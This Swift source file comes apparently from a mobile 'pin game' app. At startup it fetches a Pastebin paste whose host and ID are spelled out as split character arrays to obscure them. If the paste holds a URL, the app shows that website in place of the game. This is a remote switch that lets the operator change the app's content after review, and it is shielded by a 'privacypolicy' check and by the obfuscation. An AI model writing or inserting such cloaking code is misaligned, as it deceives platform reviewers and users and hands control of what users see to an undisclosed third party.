import Foundation

enum PinGameLinks {
    private static let pastebinHost = ["pas", "te", "bi", "n", ".", "co", "m"].joined()
    static let pastebinHosts: Set<String> = [pastebinHost, "www." + pastebinHost]

    static let pastebin: URL = {
        let pasteID = ["E", "2", "9", "R", "G", "a", "Q", "d"].joined()
        var components = URLComponents()
        components.scheme = "https"
        components.host = pastebinHost
        components.path = "/" + pasteID
        return components.url!
    }()

    static let rawPastebin = pastebin.deletingLastPathComponent()
        .appendingPathComponent("raw", isDirectory: true)
        .appendingPathComponent(pastebin.lastPathComponent)

    static func isWebURL(_ url: URL) -> Bool {
        url.scheme?.lowercased() == "https" && url.host?.isEmpty == false &&
            url.user == nil && url.password == nil
    }
}

enum StartupRoute: Equatable {
    case game
    case website(URL)

    static func load() async -> StartupRoute {
        let configuration = URLSessionConfiguration.ephemeral
        configuration.timeoutIntervalForRequest = 6
        configuration.timeoutIntervalForResource = 6
        let session = URLSession(configuration: configuration)
        defer { session.finishTasksAndInvalidate() }

        do {
            let (data, response) = try await session.data(from: PinGameLinks.rawPastebin)
            guard let http = response as? HTTPURLResponse,
                  (200..<300).contains(http.statusCode),
                  http.mimeType?.lowercased() == "text/plain",
                  let host = http.url?.host?.lowercased(),
                  PinGameLinks.pastebinHosts.contains(host),
                  data.count <= 64 * 1024,
                  let text = String(data: data, encoding: .utf8) else { return .game }
            return parse(text)
        } catch {
            return .game
        }
    }

    static func parse(_ text: String) -> StartupRoute {
        guard text.range(of: "privacypolicy", options: .caseInsensitive) == nil else { return .game }

        for line in text.split(whereSeparator: \.isNewline) {
            let value = line.trimmingCharacters(in: .whitespacesAndNewlines)
            guard !value.contains(where: \.isWhitespace),
                  let url = URL(string: value), PinGameLinks.isWebURL(url) else { continue }
            return .website(url)
        }
        return .game
    }
}
